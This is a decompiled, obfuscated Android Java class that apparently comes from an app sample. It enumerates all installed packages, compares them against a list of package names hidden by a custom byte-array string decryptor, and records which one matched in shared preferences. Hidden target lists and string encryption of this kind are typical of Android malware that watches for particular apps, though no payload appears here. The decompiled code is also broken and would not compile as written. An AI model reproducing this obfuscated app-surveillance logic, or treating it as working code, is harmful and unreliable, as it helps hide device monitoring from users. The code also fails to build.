package org.tvso.idwd.tfab;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.preference.PreferenceManager;
import java.util.ArrayList;
import java.util.List;
import java.util.StringTokenizer;

public final class zq
{
  private static final byte[] fh;
  private static String oh;
  private static int ui;
  
  public zq() {}
  
  private static String fh(int paramInt)
  {
    int i = (byte)fh[59];
    byte b = (byte)fh[9];
    String str = oh(i, b, b).intern();
    i = (byte)fh[59];
    b = (byte)fh[9];
    return str.substring(oh(i, b, b).intern().length() - paramInt);
  }
  
  private static List<String> fh(String paramString)
  {
    paramString = new StringTokenizer(paramString);
    ArrayList localArrayList = new ArrayList(paramString.countTokens());
    while (paramString.hasMoreTokens()) {
      localArrayList.add(paramString.nextToken().trim());
    }
    return localArrayList;
  }
  
  private static String oh()
    throws Exception
  {
    String str = oh;
    int i = (byte)fh[59];
    byte b = (byte)fh[9];
    if (str.equals(oh(i, b, b).intern())) {
      return za.oh(oh(md.oh.length), fh(md.oh.length));
    }
    return oh(0);
  }
  
  private static String oh(int paramInt)
  {
    return oh.substring(md.oh.length - md.oh.length, oh.length() - paramInt);
  }
  
  private static String oh(int paramInt, byte paramByte, short paramShort)
  {
    byte[] arrayOfByte1 = fh;
    paramInt += 4;
    byte b = 100 - paramByte * 2;
    paramByte = 0;
    int j = 0;
    int k = 9844 - paramShort * 9839;
    byte[] arrayOfByte2 = new byte[k];
    paramShort = paramByte;
    short s = paramInt;
    paramByte = b;
    if (arrayOfByte1 == null)
    {
      paramByte = paramInt;
      paramShort = paramInt;
      paramInt = j;
    }
    for (;;)
    {
      paramByte += b;
      s = paramShort;
      paramShort = paramInt;
      s += 1;
      int i = (byte)paramByte;
      paramInt = paramShort + 1;
      arrayOfByte2[paramShort] = i;
      if (paramInt == k) {
        return new String(arrayOfByte2, 0);
      }
      b = arrayOfByte1[s];
      paramShort = s;
    }
  }
  
  private static List<String> oh(Context paramContext, boolean paramBoolean)
  {
    ArrayList localArrayList = new ArrayList();
    paramContext = paramContext.getPackageManager().getInstalledPackages(md.oh.length - md.oh.length);
    int i = 0;
    while (i < paramContext.size())
    {
      PackageInfo localPackageInfo = (PackageInfo)paramContext.get(i);
      if ((paramBoolean) || (localPackageInfo.versionName != null)) {
        localArrayList.add(localPackageInfo.packageName);
      }
      i += 1;
    }
    return localArrayList;
  }
  
  private static void oh(Context paramContext, int paramInt)
  {
    paramContext = PreferenceManager.getDefaultSharedPreferences(paramContext).edit();
    int i = (byte)fh[''];
    byte b = (byte)fh[125];
    paramContext.putInt(oh(i, b, b).intern(), paramInt).apply();
  }
  
  public static boolean oh(Context paramContext)
    throws Exception
  {
    List localList = fh(oh());
    return oh(paramContext, oh(paramContext, false), localList);
  }
  
  private static boolean oh(Context paramContext, List<String> paramList1, List<String> paramList2)
  {
    int i = 0;
    while (i < paramList1.size())
    {
      int j = 0;
      while (j < paramList2.size())
      {
        if (((String)paramList1.get(i)).equals((String)paramList2.get(j)))
        {
          oh(paramContext, j);
          return true;
        }
        j += 1;
      }
      i += 1;
    }
    return false;
  }
  
  public static boolean oh(String paramString)
    throws Exception
  {
    return oh().contains(paramString);
  }
}
